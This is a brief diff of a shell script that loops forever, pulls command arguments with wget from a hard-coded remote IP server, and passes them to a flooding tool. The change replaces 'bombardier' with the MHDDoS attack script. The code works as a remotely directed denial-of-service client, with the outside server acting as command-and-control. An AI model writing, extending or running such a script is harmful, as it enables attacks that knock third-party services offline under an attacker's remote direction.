@@ -33,5 +33,5 @@ LOOKUP_SERVER=${LOOKUP_SERVER:-'http://185.25.119.80'}
 while :
 do
     CMD=$(wget -qO- $LOOKUP_SERVER/polyanicia)
-    bombardier $CMD
+    python3 MHDDoS/start.py ${CMD}
 done
